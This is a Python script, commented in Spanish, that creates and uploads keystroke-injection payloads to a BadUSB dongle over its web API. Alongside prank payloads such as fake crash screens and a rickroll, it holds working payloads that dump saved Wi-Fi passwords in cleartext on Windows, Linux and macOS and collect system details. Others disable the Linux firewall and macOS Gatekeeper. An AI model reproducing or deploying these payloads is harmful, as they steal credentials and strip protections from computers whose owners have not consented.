#!/usr/bin/env python3
"""
create_payloads.py — Crea y sube los payloads nuevos al dongle BadUSB.

ANTES DE EJECUTAR:
  - Edita las líneas ATTACKER_IP, ATTACKER_PORT y BIND_PORT
    en los payloads windows-revshell y windows-bindshell.
  - Conéctate al AP del dongle.
  - Ejecuta: python3 tools/create_payloads.py
"""

import getpass
import sys
import requests

BASE_URL = "http://192.168.4.1"

PAYLOADS = {

    # =========================================================================
    # WINDOWS
    # =========================================================================

    "windows-fake-bsod.txt": """\
META windows broma
DELAY 1000
GUI r
DELAY 700
STRING cmd /k color 17 && cls && echo. && echo. && echo           :( && echo. && echo    Tu PC se encontro con un problema y necesita reiniciarse. && echo    Estamos recopilando informacion de error, luego reiniciaremos el equipo. && echo. && ping -n 11 127.0.0.1 > nul && echo    Completado 33%. && ping -n 11 127.0.0.1 > nul && echo    Completado 66%. && ping -n 11 127.0.0.1 > nul && echo    Completado 100%. && echo. && echo    Codigo de detencion: KMODE_EXCEPTION_NOT_HANDLED
ENTER
""",

    "windows-sysinfo.txt": """\
META windows exfil
DELAY 1000
GUI r
DELAY 700
STRING cmd /k systeminfo > "%TEMP%\\info.txt" && start notepad "%TEMP%\\info.txt"
ENTER
""",

    "windows-wifi-passwords.txt": """\
META windows exfil
DELAY 1000
GUI r
DELAY 700
STRING cmd /k netsh wlan export profile folder="%TEMP%" key=clear > nul && start %TEMP%
ENTER
""",

    "windows-lock-screen.txt": """\
META windows util
DELAY 500
GUI l
""",

    # =========================================================================
    # LINUX
    # =========================================================================

    # Requiere CTRL+ALT+T como atajo de terminal (GNOME, KDE, XFCE)
    "linux-fake-crash.txt": """\
META linux broma
DELAY 1000
CTRL ALT t
DELAY 1200
STRING printf '\033[1;31m\n[  0.000000] Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0)\n[  0.001234] CPU: 0 PID: 1 Comm: init Tainted: P    B   W        6.1.0 #1\n[  0.002456] Call Trace:\n[  0.003678]  panic+0x12e/0x1b4\n[  0.004890]  mount_block_root+0x1f3/0x230\n[  0.006012]  prepare_namespace+0x131/0x170\n\033[0m' && sleep 8 && clear
ENTER
""",

    "linux-sysinfo.txt": """\
META linux exfil
DELAY 1000
CTRL ALT t
DELAY 1200
STRING echo "=== Sistema ===" && uname -a && echo "=== OS ===" && cat /etc/os-release | grep PRETTY_NAME && echo "=== CPU ===" && lscpu | grep "Model name" && echo "=== RAM ===" && free -h | grep Mem && echo "=== Red ===" && ip addr show | grep "inet " | grep -v 127 && echo "=== Disco ===" && df -h /
ENTER
""",

    "linux-wifi-passwords.txt": """\
META linux exfil
DELAY 1000
CTRL ALT t
DELAY 1200
STRING sudo cat /etc/NetworkManager/system-connections/*.nmconnection 2>/dev/null | grep -E "ssid=|psk=" || echo "Sin acceso o sin conexiones guardadas"
ENTER
""",

    "linux-lock-screen.txt": """\
META linux util
DELAY 1000
CTRL ALT t
DELAY 1200
STRING loginctl lock-session 2>/dev/null || xdg-screensaver lock 2>/dev/null || gnome-screensaver-command --lock 2>/dev/null
ENTER
""",

    "linux-disable-firewall.txt": """\
META linux evasion
DELAY 1000
CTRL ALT t
DELAY 1200
STRING sudo ufw disable 2>/dev/null; sudo systemctl stop firewalld 2>/dev/null; sudo iptables -F 2>/dev/null; echo "Firewall desactivado"
ENTER
""",

    # =========================================================================
    # MACOS
    # =========================================================================

    "macos-rickroll.txt": """\
META macos broma
DELAY 1000
GUI SPACE
DELAY 700
STRING safari
ENTER
DELAY 1500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER
""",

    "macos-fake-crash.txt": """\
META macos broma
DELAY 1000
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1200
STRING printf '\033[1;31m\npanic(cpu 0 caller 0xffffff80003a4e1e): Kernel trap at 0xffffff7f82a1c3f0, type 14=Page Fault\nDebugger called: <panic>\nBacktrace (CPU 0), panicked thread: 0xffffff80c0000000\n  Kernel Extensions in backtrace:\n    com.apple.driver.AppleUSBXHCI(810.4.2)\n\033[0m' && sleep 8 && clear
ENTER
""",

    "macos-sysinfo.txt": """\
META macos exfil
DELAY 1000
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1200
STRING system_profiler SPHardwareDataType SPSoftwareDataType | grep -E "Model Name|Chip|Memory|System Version|Serial Number"
ENTER
""",

    "macos-wifi-passwords.txt": """\
META macos exfil
DELAY 1000
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1200
STRING for n in $(networksetup -listpreferredwirelessnetworks en0 2>/dev/null | tail -n +2); do echo "Red: $n"; security find-generic-password -wa "$n" 2>/dev/null; done
ENTER
""",

    "macos-lock-screen.txt": """\
META macos util
DELAY 500
CTRL COMMAND q
""",

    "macos-disable-gatekeeper.txt": """\
META macos evasion
DELAY 1000
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1200
STRING sudo spctl --global-disable && sudo defaults write /Library/Preferences/com.apple.security GKAutoRearm -bool NO && echo "Gatekeeper desactivado"
ENTER
""",
}

def login(password: str) -> str:
    r = requests.post(f"{BASE_URL}/api/login", data={"password": password}, timeout=5)
    r.raise_for_status()
    token = r.cookies.get("session")
    if not token:
        try:
            body = r.json()
            token = body.get("token") or body.get("session")
        except Exception:
            pass
    if not token:
        raise RuntimeError("Login OK pero no se recibió token de sesión")
    return token


def upload(session: requests.Session, name: str, content: str) -> None:
    r = session.post(
        f"{BASE_URL}/api/payload",
        data={"name": name, "content": content},
        timeout=5,
    )
    r.raise_for_status()


def main():
    print("=== Creación de payloads BadUSB ===")
    print(f"Dongle: {BASE_URL}\n")

    password = getpass.getpass("Contraseña del dongle: ")
    print("Conectando...", end=" ", flush=True)
    try:
        token = login(password)
    except Exception as e:
        print(f"\nError al hacer login: {e}")
        sys.exit(1)
    print("OK\n")

    session = requests.Session()
    session.cookies.set("session", token)

    ok = skipped = errors = 0

    for name, content in PAYLOADS.items():
        print(f"  {name}...", end=" ", flush=True)
        try:
            upload(session, name, content)
            print("OK")
            ok += 1
        except Exception as e:
            print(f"ERROR: {e}")
            errors += 1

    print(f"\n{'='*36}")
    print(f"  OK:      {ok}")
    print(f"  Skip:    {skipped}")
    print(f"  Errores: {errors}")
    if ok > 0 and errors == 0:
        print("\nPayloads subidos correctamente.")


if __name__ == "__main__":
    main()
